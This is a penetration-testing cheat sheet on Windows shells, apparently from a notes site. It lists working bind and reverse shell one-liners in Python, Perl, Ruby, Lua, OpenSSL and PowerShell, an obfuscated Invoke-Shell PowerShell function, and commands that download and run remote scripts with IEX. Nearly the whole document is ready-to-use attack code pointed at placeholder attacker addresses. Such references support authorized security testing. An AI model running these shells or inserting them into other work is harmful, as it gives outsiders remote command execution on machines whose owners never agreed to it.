# Windows Shells

## Shellgen

Shellgen is a tool that generates bind shells and reverse shells, it can help you when choosing a shell:

{% embed url="https://github.com/wixnic/shellgen" %}

## Bind Shells

### PowerCat

```text
https://github.com/besimorhino/powercat

# Victim (listen)
. .\powercat.ps1
powercat -l -p 7002 -ep

# Connect from attacker
. .\powercat.ps1
powercat -c 127.0.0.1 -p 7002
```

### Netcat Traditional

```text
nc -nlvp 51337 -e cmd.exe
```

## Reverse Shells

### Python

```text
#WindowsC:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

### Perl

```text
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Ruby

```text
#Windowsruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Lua

```text
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

### OpenSSH

Attacker

```text
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificateopenssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commandsopenssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```

Victim

```text
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
​
#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```

### Powershell

```text
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```text
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```text
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
```

### Invoke-Shell

```text
function Invoke-Shell 
{ 
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $World,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Country,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    try 
    {
        if ($Reverse)
        {
            $dGtrfokiudfjhvnjfe = New-Object System.Net.Sockets.TCPClient($World,$Country)
        }

        if ($Bind)
        {
            $eDDfh987654567 = [System.Net.Sockets.TcpListener]$Country
            $eDDfh987654567.start()    
            $dGtrfokiudfjhvnjfe = $eDDfh987654567.AcceptTcpClient()
        } 

        $zrt54789dvbgH = $dGtrfokiudfjhvnjfe.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        $gfklighloiujGHds = ([text.encoding]::ASCII).GetBytes("Windows PowerShell`nMicrosoft Corporation.`n`n")
        $zrt54789dvbgH.Write($gfklighloiujGHds,0,$gfklighloiujGHds.Length)

        $gfklighloiujGHds = ([text.encoding]::ASCII).GetBytes('$ ' + (Get-Location).Path + '>>')
        $zrt54789dvbgH.Write($gfklighloiujGHds,0,$gfklighloiujGHds.Length)

        while(($i = $zrt54789dvbgH.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                $Poec56fd345 = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something wrong" 
                Write-Error $_
            }
            $GFGFGBbvbgrefdf  = $Poec56fd345 + 'PS ' + (Get-Location).Path + '> '
            $ggh45RedCzIk = ($error[0] | Out-String)
            $error.clear()
            $GFGFGBbvbgrefdf = $GFGFGBbvbgrefdf + $ggh45RedCzIk

            $sendbyte = ([text.encoding]::ASCII).GetBytes($GFGFGBbvbgrefdf)
            $zrt54789dvbgH.Write($sendbyte,0,$sendbyte.Length)
            $zrt54789dvbgH.Flush()  
        }
        $dGtrfokiudfjhvnjfe.Close()
        if ($eDDfh987654567)
        {
            $eDDfh987654567.Stop()
        }
    }
    catch
    {
        Write-Warning "Something wrong!" 
        Write-Error $_
    }
}

Invoke-Shell -Reverse -world 10.10.10.10 -CountrY 443
```

## Fully Interactive Shell on Windows

Pseudo Console \(ConPty\) in Windows has improved the way Windows handles terminals.

**ConPtyShell uses the function** [**CreatePseudoConsole\(\)**](https://docs.microsoft.com/en-us/windows/console/createpseudoconsole)**.** 

* This function is available since Windows 10 / Windows Server 2019 version 1809 \(build 10.0.17763\).

Server Side:

```text
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

Client Side:

```text
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
```

Offline version of the ps1 available at:

{% embed url="https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1" %}





